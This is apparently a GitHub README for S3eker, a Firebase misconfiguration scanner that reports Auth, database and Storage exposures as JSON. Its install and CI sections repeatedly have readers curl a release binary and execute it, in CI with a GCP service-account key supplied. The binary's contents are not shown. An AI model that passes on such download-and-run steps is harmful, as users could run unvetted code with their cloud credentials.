S3eker — Firebase Misconfiguration Scanner for Auth & Storage

[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue?style=for-the-badge)](https://github.com/Ad661-uckkk/S3eker/releases)

[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE) [![Topics](https://img.shields.io/badge/topics-audit%2C%20bug--bounty%2C%20firebase-orange.svg)]()

<img src="https://firebase.google.com/images/brand-guidelines/logo-logomark.png" alt="Firebase" width="90" align="right">

A focused scanner for Firebase projects. It inspects Auth, Realtime Database (RTDB), Firestore, and Storage for common misconfigurations. It reports risks in a compact JSON format that you can parse in CI, bug-bounty workflows, or pentest reports.

Quick links
- Releases (download and run): https://github.com/Ad661-uckkk/S3eker/releases
- Release badge: click the button at the top to open the same Releases page.

Why S3eker
- Find common misconfigurations in Firebase that lead to data exposure.
- Produce machine-readable JSON to feed into pipelines.
- Support common pentest and bug-bounty workflows.
- Keep checks short and targeted so scans finish fast.

Screenshots & visuals
- Banner: ![cloud-security](https://images.unsplash.com/photo-1526378720121-7fcf46f1b8f0?ixlib=rb-4.0.3&w=1200&q=80)
- Firebase mark: shown at the top right for quick recognition.

Features
- Auth checks
  - Detects overly permissive OAuth or anonymous sign-in settings.
  - Finds default, weak, or test accounts still enabled.
  - Flags misconfigured identity providers.
- Realtime Database (RTDB)
  - Detects public read/write rules.
  - Finds rules that allow auth bypass.
  - Checks for broad wildcard rules like ".read": true.
- Firestore
  - Detects collection-level allow rules that grant open access.
  - Flags missing auth checks on sensitive collections.
  - Shows exact rule lines that cause exposure.
- Storage
  - Detects publicly readable or writable buckets.
  - Finds permissive security rules that permit uploads from any origin.
- Output
  - JSON-first format. Each finding includes service, severity, description, location, and remediation.
  - Exit codes map to scan result: 0 = no critical findings, 1 = findings present, 2 = execution error.
- Integrations
  - Designed for CI. Use it in GitHub Actions, GitLab CI, or custom pipelines.
  - Use JSON output to post issues to tracking systems or bug-bounty platforms.

Install
- Download the release asset from the Releases page and execute it.
  - Pick the asset that matches your OS on https://github.com/Ad661-uckkk/S3eker/releases and download it.
  - Example (Linux binary name is an example; use the actual asset name from Releases):
    - curl -L -o s3eker-linux-amd64 "https://github.com/Ad661-uckkk/S3eker/releases/download/vX.Y/s3eker-linux-amd64"
    - chmod +x s3eker-linux-amd64
    - ./s3eker-linux-amd64 --help
  - Mac example:
    - curl -L -o s3eker-macos "https://github.com/Ad661-uckkk/S3eker/releases/download/vX.Y/s3eker-macos"
    - chmod +x s3eker-macos
    - ./s3eker-macos --help
  - Windows example:
    - Download s3eker-windows.exe from https://github.com/Ad661-uckkk/S3eker/releases and run it in PowerShell or cmd.
- If the Releases link is not available or fails, check the Releases section on this repo page to find builds and assets.

Usage
- Basic scan
  - ./s3eker --project my-firebase-project-id
- Scan with output file
  - ./s3eker --project my-firebase-project-id --out findings.json
- Scan using a service account
  - ./s3eker --project my-firebase-project-id --creds /path/to/service-account.json --out findings.json
- Scan a single service
  - ./s3eker --project my-firebase-project-id --check firestore --out firestore-findings.json
- CI-friendly run (example)
  - curl -L -o s3eker "https://github.com/Ad661-uckkk/S3eker/releases/download/vX.Y/s3eker-linux-amd64"
  - chmod +x s3eker
  - ./s3eker --project $FIREBASE_PROJECT --creds $GCP_SA_KEY --out results.json
  - cat results.json | jq '.findings[] | {service, severity, id, path}'

Command reference (common flags)
- --project <PROJECT_ID>      Firebase / GCP project id (required)
- --creds <FILE>             Path to GCP service account JSON (optional)
- --out <FILE>               Write JSON results to FILE (defaults to stdout)
- --check <service>          Limit checks to one service: auth, rtdb, firestore, storage
- --format <format>          Output format: json, pretty (default: json)
- --concurrency <n>         Number of concurrent checks (default: 4)
- --help                     Show help and exit

Checks performed (examples)
- Auth
  - Anonymous sign-in enabled with public rules.
  - OAuth providers without redirect URI checks.
  - Weak default passwords on test accounts.
- RTDB
  - .read or .write set to true at root or wide path.
  - Rules that skip auth checks via auth == null checks.
  - Timestamp-based rules that expired and opened access.
- Firestore
  - allow read: if true; or allow write: if true;
  - Missing allow rules that validate request.auth.uid
  - Rules that trust client input in queries
- Storage
  - allUsers or allAuthenticatedUsers in IAM.
  - Storage rules that allow upload to public paths.
  - Public ACLs on objects or buckets.
- Others
  - Missing security rules file in repo.
  - Exposed plist or config files found in iOS app that leak API keys or project IDs.

JSON output example
{
  "project": "my-firebase-project-id",
  "timestamp": "2025-08-18T12:00:00Z",
  "findings": [
    {
      "id": "rtdb-001",
      "service": "rtdb",
      "path": "/",
      "severity": "high",
      "title": "Realtime Database root is public",
      "description": "The RTDB rules allow public read and write at the database root.",
      "rule_snippet": "{ \"rules\": { \".read\": true, \".write\": true } }",
      "remediation": "Restrict .read and .write. Validate request.auth.uid in rules.",
      "references": [
        "https://firebase.google.com/docs/database/security"
      ]
    },
    {
      "id": "storage-003",
      "service": "storage",
      "path": "gs://my-bucket",
      "severity": "medium",
      "title": "Storage bucket public",
      "description": "Bucket grants allUsers READER permission via IAM.",
      "remediation": "Remove allUsers and use fine-grained rules.",
      "references": [
        "https://cloud.google.com/storage/docs/access-control"
      ]
    }
  ]
}

Severity and exit codes
- Severity values: info, low, medium, high, critical.
- Exit codes:
  - 0: no high or critical findings
  - 1: one or more findings detected
  - 2: execution error (invalid args, creds error)

Integrations and workflows
- GitHub Actions
  - Add a step to download the release asset and run a scan.
  - Use results.json to fail the job on critical findings.
- Automated bug-bounty reports
  - Parse JSON results to prepare issues or bounty submissions.
- Local pentest
  - Run the scanner while authenticated with a service account or during an authenticated session.
- Forensic or OSINT
  - Use the scanner to quickly map exposed endpoints in a public project.

Best practices
- Run scans on CI against staging projects before production.
- Use a least-privilege service account for scanning.
- Store findings in a secure tracker and assign remediation tickets.
- Rotate service account keys and remove expired test accounts.

Contributing
- Fork the repo and open a pull request.
- Add tests for new checks.
- Keep changes small and focused.
- Write clear changelog entries for new checks or breaking changes.

Repository topics
- audit, bug-bounty, cloud-storage, firebase, firestore, gcp, google-cloud, infosec, ios, misconfiguration, osint, pentest, plist, rtdb, scanner, security

Security
- Use a dedicated service account for scans.
- Avoid embedding credentials in public CI logs.
- Check the Releases page for signed assets and recommended checks.

Releases and downloads
- Visit the Releases page to find binaries and assets:
  - https://github.com/Ad661-uckkk/S3eker/releases
- Download the appropriate build for your platform and execute it as shown in the Install section.

Authors
- Maintainer: Ad661-uckkk
- Contributions welcome via pull requests and issues.

License
- MIT. See the LICENSE file for full terms.